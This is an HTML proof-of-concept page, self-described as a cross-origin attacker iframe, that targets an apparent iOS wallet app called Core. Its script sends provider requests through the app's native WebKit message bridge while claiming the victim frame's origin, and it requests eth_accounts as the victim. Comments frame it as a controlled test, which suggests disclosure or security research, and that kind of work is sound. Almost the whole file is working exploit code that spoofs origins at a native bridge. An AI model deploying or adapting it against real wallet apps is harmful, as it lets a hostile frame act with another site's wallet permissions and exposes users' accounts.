<!doctype html>
<meta charset="utf-8">

Cross-origin attacker iframe.

<script>
const params =
  new URLSearchParams(location.search);

const victimOrigin =
  params.get('victimOrigin');

if (
  !victimOrigin ||
  new URL(victimOrigin).origin !== victimOrigin
) {
  throw new Error('Invalid victimOrigin');
}


/*
 * Send a provider request directly through
 * Core's native bridge.
 *
 * Actual frame origin = Origin B
 * Claimed origin      = Origin A
 */
function nativeRequest(id, method) {
  const wrapper = JSON.stringify({
    method: 'provider_request',

    payload: JSON.stringify({
      id,

      origin: victimOrigin,

      request: {
        method,
        params: []
      }
    })
  });

  const bridge =
    window.webkit?.messageHandlers
      ?.ReactNativeWebView;

  if (!bridge?.postMessage) {
    throw new Error(
      'Core iOS native bridge unavailable'
    );
  }

  bridge.postMessage(wrapper);
}


/*
 * Observe native responses that Core dispatches
 * back into the top-level document.
 *
 * We use a known ID only for this controlled test.
 */
const TEST_ID = 733731;


/*
 * Ask the parent to observe the corresponding
 * Core callback result.
 *
 * We cannot directly read Origin A's JS state,
 * so the test result is reported by A.
 */
addEventListener('message', event => {
  if (event.source !== parent)
    return;

  if (event.origin !== victimOrigin)
    return;

  if (event.data?.type !== 'READ_ACCOUNTS_AS_A')
    return;

  nativeRequest(
    TEST_ID,
    'eth_accounts'
  );

  parent.postMessage({
    type: 'ATTACK_SENT',
    id: TEST_ID
  }, victimOrigin);
});


parent.postMessage(
  { type: 'READY' },
  victimOrigin
);
</script>
